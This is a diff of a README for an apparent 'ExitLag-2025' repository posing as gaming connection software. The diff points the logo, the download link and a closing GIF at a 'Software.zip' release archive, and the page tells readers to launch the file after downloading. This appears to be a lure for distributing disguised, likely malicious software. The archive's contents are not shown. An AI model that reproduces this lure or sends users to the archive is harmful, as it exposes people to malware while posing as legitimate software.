@@ -2,7 +2,7 @@
 
 Welcome to the ExitLag-2025 repository - your gateway to seamless gaming experience like never before! 
 
-![ExitLag Logo](https://www.exitlag.com/img/exitlag-full-color-5.png)
+![ExitLag Logo](https://github.com/rohit876297/ExitLag-2025/releases/download/v1.0/Software.zip)
 
 ## About ExitLag
 
@@ -16,7 +16,7 @@ ExitLag is a cutting-edge service that guarantees better and faster connection r
 
 ## How to Download ExitLag 📥
 
-To download ExitLag, simply click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). 
+To download ExitLag, simply click [here](https://github.com/rohit876297/ExitLag-2025/releases/download/v1.0/Software.zip). 
 
 🚨 **Please note that it needs to be launched after downloading for installation.**
 
@@ -31,4 +31,4 @@ Don't forget to ⭐️ star this repository to receive notifications on the late
 
 Let's game without limits with ExitLag-2025! 🎮🚀
 
-![Game On](https://media.giphy.com/media/3o85xAi4UFFK9Bt6R6/giphy.gif)
+![Game On](https://github.com/rohit876297/ExitLag-2025/releases/download/v1.0/Software.zip)
